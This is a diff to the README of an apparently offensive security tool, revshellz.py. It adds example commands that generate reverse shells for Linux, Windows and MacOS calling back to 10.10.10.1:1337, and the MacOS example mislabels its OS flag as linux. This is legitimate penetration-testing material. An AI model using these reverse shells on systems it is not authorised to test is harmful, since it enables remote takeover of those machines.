@@ -65,7 +65,15 @@ python3 revshellz.py -l macos
 
 #### Example
 
-Generating reverse shell
+Generating reverse shell for Linux
 ```
 python3 revshellz.py -ip 10.10.10.1 -p 1337 -rs 'bash -i' -os linux
+```
+Generating reverse shell for Windows
+```
+python3 revshellz.py -ip 10.10.10.1 -p 1337 -rs 'PowerShell #1' -os windows
+```
+Generating reverse shell for MacOS
+```
+python3 revshellz.py -ip 10.10.10.1 -p 1337 -rs 'nc mkfifo' -os linux
 ```
